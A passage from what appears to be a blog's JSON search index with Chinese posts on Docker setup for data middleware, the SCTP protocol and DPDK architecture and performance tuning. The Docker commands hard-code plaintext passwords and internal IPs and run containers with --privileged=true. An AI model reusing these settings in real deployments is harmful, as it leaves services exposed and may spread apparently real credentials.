重启服务","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"},{"name":"ftp","slug":"ftp","permalink":"https://wuhaocn.github.io/tags/ftp/"}]},{"title":"数据环境","slug":"devops/docker/数据环境","date":"2021-08-24T07:00:25.063Z","updated":"2021-08-31T11:45:24.029Z","comments":true,"path":"2021/08/24/devops/docker/数据环境/","link":"","permalink":"https://wuhaocn.github.io/2021/08/24/devops/docker/%E6%95%B0%E6%8D%AE%E7%8E%AF%E5%A2%83/","excerpt":"","text":"docker部署数据中间件 docker部署开发环境数据中间件 常见工具命令123docker rm `docker ps -a -q`docker start $(docker ps -a | awk &#x27;&#123; print $1&#125;&#x27; | tail -n +2)docker stop $(docker ps -a | awk &#x27;&#123; print $1&#125;&#x27; | tail -n +2) mysql1234567891011121314151617181920212223# mysql5.6.40docker stop mysql.5.6.40docker rm mysql.5.6.40docker run --privileged=true --name mysql.5.6.40 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=coral@2018 -d mysql:5.6.40docker update mysql.5.6.40 --restart=always# mysql3336docker stop mysql3336docker rm mysql3336docker run --privileged=true --name mysql3336 -p 3336:3306 -e MYSQL_ROOT_PASSWORD=coral@2018 -d mysql:5.6.40docker update mysql3336 --restart=always# mysql3337docker stop mysql3337docker rm mysql3337docker run --privileged=true --name mysql3337 -p 3337:3306 -e MYSQL_ROOT_PASSWORD=coral@2018 -d mysql:5.6.40docker update mysql3337 --restart=always# mysql5.7.19docker stop mysql5.7.19docker rm mysql5.7.19docker run --name mysql5.7.19 --privileged=true -p 3337:3306 -e MYSQL_ROOT_PASSWORD=coral@2018 -d mysql:5.7.19 redis12345678910111213141516171819202122232425262728293031# redis 单机docker stop redis-6379docker rm redis-6379docker run -d -p 6379:6379 --name redis-6379 --privileged=true redis:3.2 redis-server --port 6379 --requirepass &quot;urcs@2021&quot;docker update redis-6379 --restart=alwaysdocker stop redis-6380docker rm redis-6380docker run -d -p 6380:6380 --name redis-6380 --privileged=true redis:3.2 redis-server --port 6380docker stop redis-6379docker rm redis-6379docker run -d -p 6379:6379 --name redis-6379 --privileged=true redis:3.2 redis-server --port 6379docker update redis-6379 --restart=alwaysdocker stop redis-6379docker rm redis-6379docker run -d -p 6379:6379 --name redis-6379 --privileged=true redis:6.2 redis-server --port 6379docker update redis-6379 --restart=always# sentinel在当前目录配置文件vim sentinel.confsentinel monitor mymaster 10.10.220.120 6379 1启动sentineldocker stop redis-sentinel-26379docker rm redis-sentinel-26379docker run -d -p 26379:26379 -v /Users/wuhao/data/soft/redis/sentinel.conf:/usr/local/bin/redis-conf/sentinel.conf --name redis-sentinel-26379 redis:3.2 redis-sentinel /usr/local/bin/redis-conf/sentinel.conf --port 26379docker logs -f redis-sentinel-26379 hbase12345678910拉取镜像docker pull harisekhon/hbase:1.2运行镜像docker stop hbase1.2docker rm hbase1.2docker run -d -h hbase --privileged=true -p 2181:2181 -p 18080:8080 -p 18085:8085 -p 19090:9090 -p 19095:9095 -p 16000:16000 -p 16020:16020 -p 16010:16010 -p 16201:16201 -p 16301:16301 --name hbase1.2 harisekhon/hbase:1.2docker update hbase1.2 --restart=alwaysdocker exec -it hbase bashdocker run -d -h hbase --privileged=true -p 2181:2181 -p 18080:8080 -p 18085:8085 -p 19090:9090 -p 19095:9095 -p 16000:16000 -p 16010:16010 -p 16201:16201 -p 16301:16301 --name hbase1.2 harisekhon/hbase:1.2 zk1234567docker pull zookeeper:3.5docker run --name zookeeper3.5 -p 7998:2181 -d zookeeper:3.5docker stop zookeeperdocker rm zookeeperdocker run --privileged=true -d --name zookeeper --publish 2181:2181 -d zookeeper:3.5docker update zookeeper --restart=always kafka1234567891011docker pull wurstmeister/kafka:2.11-1.1.1docker stop kafka2.11docker rm kafka2.11docker run \\--env KAFKA_BROKER_ID=0 \\--env KAFKA_ZOOKEEPER_CONNECT=172.16.106.78:7998 \\--env KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://172.16.106.78:9092 \\--env KAFKA_LISTENERS=PLAINTEXT://0.0.0.0:9092 \\ --privileged=true -d --name kafka2.11 -p 9092:9092 \\wurstmeister/kafka:2.11-1.1.1 fastdfs123456789sudo docker stop trakcersudo docker rm trakcersudo docker run -d --privileged=true -p 22122:22122 --name trakcer --net=host 10.10.208.193:5000/urcs/fastdfs_tracker:4.08 trackersudo docker update trakcer --restart=alwayssudo docker stop storagesudo docker rm storagesudo docker run -d --privileged=true -p 23000:23000 -p 8888:8888 --name storage --net=host --env TRACKER_SERVER=172.16.106.78:22122 10.10.208.193:5000/urcs/fastdfs_storage:4.08 storagesudo docker update storage --restart=always es123456docker pull docker.elastic.co/elasticsearch/elasticsearch:6.0.0docker stop elasticsearchdocker rm elasticsearchdocker run -d --name elasticsearch \\-p 9200:9200 -p 9300:9300 \\-e &quot;discovery.type=single-node&quot; docker.elastic.co/elasticsearch/elasticsearch:6.0.0 1234567docker pull docker.elastic.co/elasticsearch/elasticsearch:6.3.2docker stop elasticsearchdocker rm elasticsearchdocker run -d --name elasticsearch \\-p 9200:9200 -p 9300:9300 \\-e &quot;discovery.type=single-node&quot; docker.elastic.co/elasticsearch/elasticsearch:6.3.2docker update elasticsearch --restart=always kibana123456docker pull elastic/kibana:6.0.0//做了定制化设置docker stop kibana6.0.0docker rm kibana6.0.0docker run -d --name kibana6.0.0 -e ELASTICSEARCH_URL=http://172.29.203.16:9200 -p 5601:5601 elastic/kibana:6.0.0 1234567docker pull elastic/kibana:6.3.2docker stop kibana6.3.2docker rm kibana6.3.2docker run -d --name kibana6.3.2 -e ELASTICSEARCH_URL=http://10.40.1.180:9200 -p 5601:5601 elastic/kibana:6.3.2docker update kibana6.3.2 --restart=always spark12docker pull sequenceiq/spark:1.6.0 docker run -it -p 8088:8088 -p 8042:8042 -h sandbox sequenceiq/spark:1.6.0 bash git123456789101112131415161718192021获取镜像docker pull beginor/gitlab-ce:11.3.0-ce.0运行通常会将 GitLab 的配置 (etc) 、 日志 (log) 、数据 (data) 放到容器之外， 便于日后升级， 因此请先准备这三个目录。sudo mkdir -p /mnt/sda1/gitlab/etcsudo mkdir -p /mnt/sda1/gitlab/logsudo mkdir -p /mnt/sda1/gitlab/data准备好这三个目录之后， 就可以开始运行 Docker 镜像了。 我的建议是使用unless-stopped 作为重启策略， 因为这样可以手工停止容器， 方便维护。完整的运行命令如下：docker run \\ --detach \\ --publish 8443:443 \\ --publish 8080:80 \\ --name gitlab \\ --restart unless-stopped \\ --volume /mnt/sda1/gitlab/etc:/etc/gitlab \\ --volume /mnt/sda1/gitlab/log:/var/log/gitlab \\ --volume /mnt/sda1/gitlab/data:/var/opt/gitlab \\ beginor/gitlab-ce:11.3.0-ce.0 ftp123456docker pull fauria/vsftpdmkdir /home/ultra/ftpdocker stop vsftpddocker rm vsftpddocker run -d -v /home/ultra/ftp:/home/vsftpd -p 2120:20 -p 2121:21 -p 21100-21110:21100-21110 -e FTP_USER=urcs -e FTP_PASS=urcs@2018 -e PASV_ADDRESS=10.10.208.194 -e PASV_MIN_PORT=21100 -e PASV_MAX_PORT=21110 --name vsftpd --restart=always fauria/vsftpddocker ps speed123docker stop speedtestdocker rm speedtestdocker run -d --name speedtest -p 8888:80 adolfintel/speedtest:latest","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"}]},{"title":"SCTP概要","slug":"network/protocol/SCTP概要","date":"2021-08-04T06:25:13.672Z","updated":"2021-08-04T06:25:13.672Z","comments":true,"path":"2021/08/04/network/protocol/SCTP概要/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/network/protocol/SCTP%E6%A6%82%E8%A6%81/","excerpt":"","text":"1.简介SCTP(Stream Control Transmission Protocol),流控制传输协议,和UDP，TCP类似TCP是一种面向连接的协议，提供可靠传输，确保数据有序发送；UDP是一种面向消息的协议，不能确保数据有序发送SCTP是后来引入的一种新的协议，提供了和TCP一样的可靠、有序的数据传输功能，同时却能和UDP一样面对消息的方式来进行操作，保护消息边界，有下面一些特性 2.SCTP特性 多宿主（Multi-Homing） 多流（Multi-streaming） 初始化保护（Initiation protection） 消息分帧（Message framing） 可配置的无序发送（Configurable unordered delivery） 平滑关闭（Graceful shutdown） ​ 2.1 多宿主SCTP里面引入了联合（Association）的概念TCP连接是在两个主机的单个接口之间建立的SCTP可以把多条路径合并到一个联合中，数据可以在任意一个连接路径上进行传输 2.2 多流 SCTP可以在一个联合中支持多流机制，每个流（stream）都是独立的。每个流都有各自的编号，编码在SCTP报文中阻塞的流不会影响同一联合中的其他流，可以并行进行传输 2.3 初始化保护 TCP中的三次握手机制会被利用来进行DoS（Denial of Service）攻击，通过发送大量的SYN报文最终耗尽服务器的资源SCTP通过引入4次握手机制来避免这种场景：服务器的INIT-ACK中会包含cookie（标识这个连接的唯一上下文）； 客户端使用这个cookie来进行响应。服务器收到这个响应后，才为这个连接分配资源；为了解决4次握手机制带来的时延，SCTP协议还允许在COOKIE-ECHO和COOKIE-ACK报文中传输数据包消息分帧TCP协议是按照字节流的方式进行数据传输的，并不存在消息边界，比如说音频视频都可以通过流的方式进行传递；UDP使用的是消息分帧，发端多大的数据包，收端收到的数据包也是这么大；可配置的无序发送TCP能确保数据按照次序发送；UDP无法保证消息有序；SCTP中也可以配置成接受无序的消息；这样的通信方式对于面向消息的传输非常有用，因为每个消息都是各自独立的，次序并不重要。平滑关闭TCP和SCTP都是基于连接的协议，完成传输后都需要有一个拆除连接的过程。TCP中连接的删除是半关闭的，服务的某一端可以关闭自己这端的socket，但是可以继续接受数据。SCTP协议设计的时候考虑这种半关闭的状态实际上很少使用，所以简化了关闭的过程，一旦某一端发起了连接拆除，对等的两端都关闭。 版权声明：本文为博主原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接和本声明。本文链接：https://blog.csdn.net/qq_34709713/article/details/106511096","categories":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"}],"tags":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"},{"name":"NGAP","slug":"NGAP","permalink":"https://wuhaocn.github.io/tags/NGAP/"}]},{"title":"DPDK-架构解析","slug":"network/dpdk/DPDK-架构解析","date":"2021-08-04T06:25:13.670Z","updated":"2021-08-04T06:25:13.670Z","comments":true,"path":"2021/08/04/network/dpdk/DPDK-架构解析/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/network/dpdk/DPDK-%E6%9E%B6%E6%9E%84%E8%A7%A3%E6%9E%90/","excerpt":"","text":"目录DPDK-架构解析 目录 前文列表 DPDK 架构 内核态模块 IGB_UIO KNI PMD DPDK Lib（核心部件库） 组件代码 平台相关模块 Classify 库 QoS 库前文列表《DPDK — 安装部署》《DPDK — 数据平面开发技术》DPDK 架构 内核态模块： IGB_UIO： KNI 用户态函数库以及网卡驱动程序： 用户态轮询模式的网卡驱动程序（PMD Driver） 核心部件库（Core Libraries） 操作系统平台相关模块（Platform） QoS 库 报文转发分类算法库（Classify） 用户应用程序可以应用以上函数库以及驱动支持，来实现完全内核旁路的数据面转发应用程序，例如：OVS-DPDK。 EAL（Environment Abstraction Layer，环境抽象层）：为应用提供了一个通用接口，隐藏了与底层库与设备打交道的相关细节。EAL 实现了 DPDK 运行的初始化工作，基于大页表的内存分配，多核亲缘性设置，原子和锁操作，并将 PCI 设备地址映射到用户空间，方便应用程序访问。 Buffer Manager API：通过预先从 EAL 上分配固定大小的多个内存对象，避免了在运行过程中动态进行内存分配和回收，以此来提高效率，用于数据包 Buffer 的管理。 Queue/Ring Manager API：以高效的方式实现了无锁的 FIFO 环形队列，适用于一个生产者多个消费者、一个消费者多个生产者模型。支持批量无锁操作，可避免锁冲突导致的等待。 Packet Flow Classification API：通过 Intel SSE 基于多元组的方式实现了高效的 HASH 算法，以便快速对数据包进行分类处理。该 API 一般用于路由查找过程中的最长前缀匹配。此外，安全产品场景中，可以根据 DataFlow 五元组来标记不同的用户。 PMD（Poll Mode Library）：则实现了 Intel 1GbE、10GbE 和 40GbE 网卡下基于轮询收发包的工作模式，大大加速网卡收发包性能。 内核态模块IGB_UIO《DPDK — IGB_UIO，与 UIO Framework 进行交互的内核模块》 KNIKNI（Kernel NIC Interface，内核网卡接口），是 DPDK 允许用户态和内核态交换报文的解决方案，模拟了一个虚拟的网口，提供 DPDK 应用程序和 Linux 内核之间通讯没接。即 KNI 接口允许报文从用户态接收后转发到 Linux 内核协议栈中去。虽然 DPDK 的高速转发性能很出色，但是也有自己的一些缺点，比如没有标准协议栈就是其中之一，当然也可能当时设计时就将没有将协议栈考虑进去，毕竟协议栈需要将报文转发处理，可能会使处理报文的能力大大降低。上图是 KNI 的 mbuf 的使用流程，也可以看出报文的流向，因为报文在代码中其实就是一个个内存指针。其中 rx_q 右边是用户态，左边是内核态。最后通过调用 netif_rx 将报文送入 Linux 内核协议栈，这其中需要将 DPDK 的 mbuf 转换成标准的 skb_buf 结构体。当 Linux 内核向 KNI 端口发送报文时，调用回调函数 kni_net_tx，然后报文经过转换之后发送到端口上。 PMD《DPDK — PMD，DPDK 的核心优化》 DPDK Lib（核心部件库）核心部件库（Core Libraries）是 DPDK 面向用户态协议栈应用程序员开发的模块。 EAL（Environment Abstraction Layer，环境抽象层）：对 DPDK 的运行环境（e.g. Linux 操作系统）进行初始化，包括：HugePage 内存分配、内存/缓冲区/队列分配、原子性无锁操作、NUMA 亲和性、CPU 绑定等，并通过 UIO 或 VFIO 技术将 PCI/PCIe 设备地址映射到用户态，方便了用户态的 DPDK 应用程序调用。同时为应用程序提供了一个通用接口，隐藏了其与底层库以及设备打交道的相关细节。 MALLOC（堆内存管理组件）：为 DPDK 应用程序提供从 HugePage 内分配堆内存的接口。当需要为 SKB（Socket Buffer，本质是若干个数据包的缓存区）分配大量的小块内存时（如：分配用于存储 Buffer descriptor table 中每个表项指针的内存）可以调用该接口。由于堆内存是从 HugePage 内存分配的，所以可以减少 TLB 缺页。 注：堆，是由开发人员主动分配和释放的存储空间， 若开发人员不释放，则程序结束时由 OS 回收，分配方式类似于链表；与堆不同，栈，是由操作系统自动分配和释放的存储空间 ，用于存放函数的参数值、局部变量等，其操作方式类似于数据结构中的栈。 MBUF（网络报文缓存块管理组件）：为 DPDK 应用程序提供创建和释放用于存储数据报文信息的缓存块的接口。提供了两种类型的 MBUF，一种用于存储一般信息，一种用于存储实际的报文数据。这些 MBUF 存储在一个内存池中。 MEMPOOL（内存池管理组件）：为 DPDK 应用程序和其它组件提供分配内存池的接口，内存池是一个由固定大小的多个内存块组成的内存容器，可用于存储不同的对像实体，如：数据报文缓存块等。内存池由内存池的名称（一个字符串）进行唯一标识，它由一个 Ring 缓冲区和一组本地缓存队列组成，每个 CPU Core 优先从自身的缓存队列中分配内存块，当本地缓存队列减少到一定程度时，开始从内存环缓冲区中申请内存块来进行补充。 RING（环缓冲区管理组件）：为 DPDK 应用程序和其它组件提供一个无锁的多生产者多消费者 FIFO 队列。 NOTE：DPDK 基于 Linux 内核的无锁环形缓冲 kfifo 实现了一套自己的无锁机制。支持单生产者入列/单消费者出列和多生产者入列/多消费者出列操作，在数据传输的时候，降低性能的同时还能保证数据的同步。 TIMER（定时器组件）：提供一些异步周期执行的接口（也可以只执行一次），可以指定某个函数在规定时间内的异步执行，就像 LIBC 中的 timer 定时器。但是这里的定时器需要 DPDK 应用程序在主循环中周期内调用 rte_timer_manage 来使能定时器，使用起来不那么方便。TIMER 的时间参考来自 EAL 层提供的时间接口。 注：除了以上六个核心组件外，DPDK 还提供以下功能： 以太网轮询模式驱动（PMD）架构：把以太网驱动从内核移到应用层，采用同步轮询机制而不是内核态的异步中断机制来提高报文的接收和发送效率。 报文转发算法支持：Hash 库和 LPM 库为报文转发算法提供支持。 网络协议定义和相关宏定义：基于 FreeBSD IP 协议栈的相关定义，如：TCP、UDP、SCTP 等协议头定义。 报文 QoS 调度库：支持随机早检测、流量整形、严格优先级和加权随机循环优先级调度等相关 QoS 功能。 内核网络接口库（KNI）：提供一种 DPDK 应用程序与内核协议栈的通信的方法，类似 Linux 的 TUN/TAP 接口，但比 TUN/TAP 接口效率高。每个物理网口可以虚拟出多个 KNI 接口。组件代码 注： RTE：Run-Time Environment EAL：Environment Abstraction Layer PMD：Poll-Mode Driver 核心部件库对应的 DPDK 核心组件实现： Memory Manager（librte_malloc，堆内存管理器）：提供一组 API，用于从 HugePages 内存创建的 memzones 中分配内存，而不是在堆中分配。这有助于改善 Linux 用户空间环境下典型的从堆中大量分配 4KB 页面而容易引起 TLB 不命中。 Memory Pool Manager（librte_mempool，内存池管理器）：内存池管理器负责分配的内存中的 Pool 对象。Pool 由名称唯一标识，并使用一个 Ring 来存储空闲对象。它提供了其他一些可选的服务，例如：每个 CPU Core 的对象缓存和对齐方式帮助，以确保将填充的对象在所有内存通道上得到均匀分布。 Ring Manager（librte_ring，环形队列管理器）：在一个大小有限的页表中，Ring 数据结构提供了一个无锁的多生产者-多消费者 FIFO API。相较于无锁队列，它有一些的优势，如：更容易实现，适应于大容量操作，而且速度更快。 一个 Ring 可以在 Memory Pool Manager 中被使用，也可以用于不同 CPU Core 或 Processor 之间作为通用的通信机制。 Network Packet Buffer Management（librte_mbuf，网络报文缓冲区管理）：提供一组 API，用于分配、释放和操作 MBUFs（数据报文缓冲区），DPDK 应用程序中可以使用这些缓存区来存储消息以及报文数据。 Timer Manager（librte_timer，定时器管理）：为 DPDK 应用程序的执行单元提供了定时服务，支持以异步的方式执行函数。定时器可以设置周期调用，也可以设置为只调用一次。DPDK 应用程序可以使用 EAL 提供的 HPET 接口来获取高精度时钟的引用，并且能在每个 Core 上根据需要进行初始化。 代码目录： 平台相关模块平台相关模块（Platform）包括 KNI、POWER（能耗管理）以及 IVSHMEM 接口。 KNI：主要通过 Linux 内核中的 kni.ko 模块将数据报文从用户态传递给内核态协议栈处理，以便常规的用户进程（e.g. Container）可以使用 Linux 内核协议栈传统的 Socket 接口对相关报文进行处理。 POWER：提供了一些 API，让 DPDK 应用程序可以根据收包速率动态调整 CPU 频率或让 CPU 进入不同的休眠状态。 IVSHMEM：模块提供了虚拟机与虚拟机之间，或者虚拟机与主机之间的零拷贝共享内存机制。当 DPDK 应用程序运行时，IVSHMEM 模块会调用 Core Libraries 的 API，把几个 HugePage 内存映射为一个 IVSHMEM 设备池，并通过参数传递给 QEMU，这样，就实现了虚拟机之间的零拷贝内存共享。Classify 库支持精确匹配（Exact Match）、最长匹配（LPM）和通配符匹配（ACL）数据报文，并提供常用的包处理的查表操作。QoS 库提供网络服务质量相关的组件，如：限速（Meter）和调度（Scheduler）。","categories":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"}],"tags":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"},{"name":"DPDK","slug":"DPDK","permalink":"https://wuhaocn.github.io/tags/DPDK/"}]},{"title":"一文看懂DPDK","slug":"network/dpdk/一文看懂DPDK","date":"2021-08-04T06:25:13.670Z","updated":"2021-08-04T06:25:13.671Z","comments":true,"path":"2021/08/04/network/dpdk/一文看懂DPDK/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/network/dpdk/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82DPDK/","excerpt":"","text":"大纲： 一、 网络IO的处境和趋势 二、 Linux + x86网络IO瓶颈 三、 DPDK的基本原理 四、 DPDK的基石UIO 五、 DPDK核心优化：PMD 六、 DPDK的高性能代码实现 七、 DPDK生态 一、网络IO的处境和趋势从我们用户的使用就可以感受到网速一直在提升，而网络技术的发展也从1GE/10GE/25GE/40GE/100GE的演变，从中可以得出单机的网络IO能力必须跟上时代的发展。1.传统的电信领域IP层及以下，例如路由器、交换机、防火墙、基站等设备都是采用硬件解决方案。基于专用网络处理器（NP），有基于FPGA，更有基于ASIC的。但是基于硬件的劣势非常明显，发生Bug不易修复，不易调试维护，并且网络技术一直在发展，例如2G/3G/4G/5G等移动技术的革新，这些属于业务的逻辑基于硬件实现太痛苦，不能快速迭代。传统领域面临的挑战是急需一套软件架构的高性能网络IO开发框架。2.云的发展私有云的出现通过网络功能虚拟化（NFV）共享硬件成为趋势，NFV的定义是通过标准的服务器、标准交换机实现各种传统的或新的网络功能。急需一套基于常用系统和标准服务器的高性能网络IO开发框架。3.单机性能的飙升网卡从1G到100G的发展，CPU从单核到多核到多CPU的发展，服务器的单机能力通过横行扩展达到新的高点。但是软件开发却无法跟上节奏，单机处理能力没能和硬件门当户对，如何开发出与时并进高吞吐量的服务，单机百万千万并发能力。即使有业务对QPS要求不高，主要是CPU密集型，但是现在大数据分析、人工智能等应用都需要在分布式服务器之间传输大量数据完成作业。这点应该是我们互联网后台开发最应关注，也最关联的。 二、Linux + x86网络IO瓶颈在数年前曾经写过《网卡工作原理及高并发下的调优》一文，描述了Linux的收发报文流程。根据经验，在C1（8核）上跑应用每1W包处理需要消耗1%软中断CPU，这意味着单机的上限是100万PPS（Packet Per Second）。从TGW（Netfilter版）的性能100万PPS，AliLVS优化了也只到150万PPS，并且他们使用的服务器的配置还是比较好的。假设，我们要跑满10GE网卡，每个包64字节，这就需要2000万PPS（注：以太网万兆网卡速度上限是1488万PPS，因为最小帧大小为84B《Bandwidth, Packets Per Second, and Other Network Performance Metrics》），100G是2亿PPS，即每个包的处理耗时不能超过50纳秒。而一次Cache Miss，不管是TLB、数据Cache、指令Cache发生Miss，回内存读取大约65纳秒，NUMA体系下跨Node通讯大约40纳秒。所以，即使不加上业务逻辑，即使纯收发包都如此艰难。我们要控制Cache的命中率，我们要了解计算机体系结构，不能发生跨Node通讯。从这些数据，我希望可以直接感受一下这里的挑战有多大，理想和现实，我们需要从中平衡。问题都有这些1.传统的收发报文方式都必须采用硬中断来做通讯，每次硬中断大约消耗100微秒，这还不算因为终止上下文所带来的Cache Miss。2.数据必须从内核态用户态之间切换拷贝带来大量CPU消耗，全局锁竞争。3.收发包都有系统调用的开销。4.内核工作在多核上，为可全局一致，即使采用Lock Free，也避免不了锁总线、内存屏障带来的性能损耗。5.从网卡到业务进程，经过的路径太长，有些其实未必要的，例如netfilter框架，这些都带来一定的消耗，而且容易Cache Miss。 三、DPDK的基本原理从前面的分析可以得知IO实现的方式、内核的瓶颈，以及数据流过内核存在不可控因素，这些都是在内核中实现，内核是导致瓶颈的原因所在，要解决问题需要绕过内核。所以主流解决方案都是旁路网卡IO，绕过内核直接在用户态收发包来解决内核的瓶颈。Linux社区也提供了旁路机制Netmap，官方数据10G网卡1400万PPS，但是Netmap没广泛使用。其原因有几个：1.Netmap需要驱动的支持，即需要网卡厂商认可这个方案。2.Netmap仍然依赖中断通知机制，没完全解决瓶颈。3.Netmap更像是几个系统调用，实现用户态直接收发包，功能太过原始，没形成依赖的网络开发框架，社区不完善。那么，我们来看看发展了十几年的DPDK，从Intel主导开发，到华为、思科、AWS等大厂商的加入，核心玩家都在该圈子里，拥有完善的社区，生态形成闭环。早期，主要是传统电信领域3层以下的应用，如华为、中国电信、中国移动都是其早期使用者，交换机、路由器、网关是主要应用场景。但是，随着上层业务的需求以及DPDK的完善，在更高的应用也在逐步出现。DPDK旁路原理：图片引自Jingjing Wu的文档《Flow Bifurcation on Intel® Ethernet Controller X710/XL710》左边是原来的方式数据从 网卡 -&gt; 驱动 -&gt; 协议栈 -&gt; Socket接口 -&gt; 业务右边是DPDK的方式，基于UIO（Userspace I/O）旁路数据。数据从 网卡 -&gt; DPDK轮询模式-&gt; DPDK基础库 -&gt; 业务用户态的好处是易用开发和维护，灵活性好。并且Crash也不影响内核运行，鲁棒性强。DPDK支持的CPU体系架构：x86、ARM、PowerPC（PPC）DPDK支持的网卡列表：https://core.dpdk.org/supported/，我们主流使用Intel 82599（光口）、Intel x540（电口） 四、DPDK的基石UIO为了让驱动运行在用户态，Linux提供UIO机制。使用UIO可以通过read感知中断，通过mmap实现和网卡的通讯。UIO原理：要开发用户态驱动有几个步骤：1.开发运行在内核的UIO模块，因为硬中断只能在内核处理2.通过/dev/uioX读取中断3.通过mmap和外设共享内存 五、DPDK核心优化：PMDDPDK的UIO驱动屏蔽了硬件发出中断，然后在用户态采用主动轮询的方式，这种模式被称为PMD（Poll Mode Driver）。UIO旁路了内核，主动轮询去掉硬中断，DPDK从而可以在用户态做收发包处理。带来Zero Copy、无系统调用的好处，同步处理减少上下文切换带来的Cache Miss。运行在PMD的Core会处于用户态CPU100%的状态网络空闲时CPU长期空转，会带来能耗问题。所以，DPDK推出Interrupt DPDK模式。Interrupt DPDK：图片引自David Su/Yunhong Jiang/Wei Wang的文档《Towards Low Latency Interrupt Mode DPDK》它的原理和NAPI很像，就是没包可处理时进入睡眠，改为中断通知。并且可以和其他进程共享同个CPU Core，但是DPDK进程会有更高调度优先级。 六、DPDK的高性能代码实现1.采用HugePage减少TLB Miss默认下Linux采用4KB为一页，页越小内存越大，页表的开销越大，页表的内存占用也越大。CPU有TLB（Translation Lookaside Buffer）成本高所以一般就只能存放几百到上千个页表项。如果进程要使用64G内存，则64G/4KB=16000000（一千六百万）页，每页在页表项中占用16000000 * 4B=62MB。如果用HugePage采用2MB作为一页，只需64G/2MB=2000，数量不在同个级别。而DPDK采用HugePage，在x86-64下支持2MB、1GB的页大小，几何级的降低了页表项的大小，从而减少TLB-Miss。并提供了内存池（Mempool）、MBuf、无锁环（Ring）、Bitmap等基础库。根据我们的实践，在数据平面（Data Plane）频繁的内存分配释放，必须使用内存池，不能直接使用rte_malloc，DPDK的内存分配实现非常简陋，不如ptmalloc。2.SNA（Shared-nothing Architecture）软件架构去中心化，尽量避免全局共享，带来全局竞争，失去横向扩展的能力。NUMA体系下不跨Node远程使用内存。3.SIMD（Single Instruction Multiple Data）从最早的mmx/sse到最新的avx2，SIMD的能力一直在增强。DPDK采用批量同时处理多个包，再用向量编程，一个周期内对所有包进行处理。比如，memcpy就使用SIMD来提高速度。SIMD在游戏后台比较常见，但是其他业务如果有类似批量处理的场景，要提高性能，也可看看能否满足。4.不使用慢速API这里需要重新定义一下慢速API，比如说gettimeofday，虽然在64位下通过vDSO已经不需要陷入内核态，只是一个纯内存访问，每秒也能达到几千万的级别。但是，不要忘记了我们在10GE下，每秒的处理能力就要达到几千万。所以即使是gettimeofday也属于慢速API。DPDK提供Cycles接口，例如rte_get_tsc_cycles接口，基于HPET或TSC实现。在x86-64下使用RDTSC指令，直接从寄存器读取，需要输入2个参数，比较常见的实现： 1234567891011static inline uint64_trte_rdtsc(void)&#123; uint32_t lo, hi; __asm__ __volatile__ ( &quot;rdtsc&quot; : &quot;=a&quot;(lo), &quot;=d&quot;(hi) ); return ((unsigned long long)lo) | (((unsigned long long)hi) &lt;&lt; 32);&#125; 这么写逻辑没错，但是还不够极致，还涉及到2次位运算才能得到结果，我们看看DPDK是怎么实现： 12345678910111213141516static inline uint64_trte_rdtsc(void)&#123; union &#123; uint64_t tsc_64; struct &#123; uint32_t lo_32; uint32_t hi_32; &#125;; &#125; tsc; asm volatile(&quot;rdtsc&quot; : &quot;=a&quot; (tsc.lo_32), &quot;=d&quot; (tsc.hi_32)); return tsc.tsc_64;&#125; 巧妙的利用C的union共享内存，直接赋值，减少了不必要的运算。但是使用tsc有些问题需要面对和解决 CPU亲和性，解决多核跳动不精确的问题 内存屏障，解决乱序执行不精确的问题 禁止降频和禁止Intel Turbo Boost，固定CPU频率，解决频率变化带来的失准问题 5.编译执行优化 分支预测现代CPU通过pipeline、superscalar提高并行处理能力，为了进一步发挥并行能力会做分支预测，提升CPU的并行能力。遇到分支时判断可能进入哪个分支，提前处理该分支的代码，预先做指令读取编码读取寄存器等，预测失败则预处理全部丢弃。我们开发业务有时候会非常清楚这个分支是true还是false，那就可以通过人工干预生成更紧凑的代码提示CPU分支预测成功率。123456789101112131415#pragma once#if !__GLIBC_PREREQ(2, 3)# if !define __builtin_expect# define __builtin_expect(x, expected_value) (x)# endif#endif#if !defined(likely)#define likely(x) (__builtin_expect(!!(x), 1))#endif#if !defined(unlikely)#define unlikely(x) (__builtin_expect(!!(x), 0))#endif CPU Cache预取Cache Miss的代价非常高，回内存读需要65纳秒，可以将即将访问的数据主动推送的CPU Cache进行优化。比较典型的场景是链表的遍历，链表的下一节点都是随机内存地址，所以CPU肯定是无法自动预加载的。但是我们在处理本节点时，可以通过CPU指令将下一个节点推送到Cache里。API文档：https://doc.dpdk.org/api/rte__prefetch_8h.html 12345678static inline void rte_prefetch0(const volatile void *p)&#123; asm volatile (&quot;prefetcht0 %[p]&quot; : : [p] &quot;m&quot; (*(const volatile char *)p));&#125;#if !defined(prefetch)#define prefetch(x) __builtin_prefetch(x)#endif …等等3) 内存对齐内存对齐有2个好处：l 避免结构体成员跨Cache Line，需2次读取才能合并到寄存器中，降低性能。结构体成员需从大到小排序和以及强制对齐。参考《Data alignment: Straighten up and fly right》 1#define __rte_packed __attribute__((__packed__)) l 多线程场景下写产生False sharing，造成Cache Miss，结构体按Cache Line对齐 1234567#ifndef CACHE_LINE_SIZE#define CACHE_LINE_SIZE 64#endif#ifndef aligined#define aligined(a) __attribute__((__aligned__(a)))#endif 常量优化常量相关的运算的编译阶段完成。比如C++11引入了constexp，比如可以使用GCC的__builtin_constant_p来判断值是否常量，然后对常量进行编译时得出结果。举例网络序主机序转换123#define rte_bswap32(x) ((uint32_t)(__builtin_constant_p(x) ? \\ rte_constant_bswap32(x) : \\ rte_arch_bswap32(x))) 其中rte_constant_bswap32的实现12345#define RTE_STATIC_BSWAP32(v) \\ ((((uint32_t)(v) &amp; UINT32_C(0x000000ff)) &lt;&lt; 24) | \\ 